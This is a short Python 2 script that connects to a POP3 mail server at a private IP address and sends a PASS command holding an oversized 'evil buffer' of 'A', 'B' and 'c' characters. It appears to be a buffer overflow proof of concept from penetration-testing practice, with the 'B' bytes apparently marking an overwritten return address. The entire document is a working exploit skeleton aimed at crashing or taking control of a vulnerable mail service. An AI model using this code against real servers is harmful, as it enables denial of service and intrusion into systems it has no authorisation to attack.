#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2606 + "B"*4+"c"*90


try:
	print "\nSending evil buffer..."
	s.connect(('10.11.15.91',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could Not Connect to POP3!"
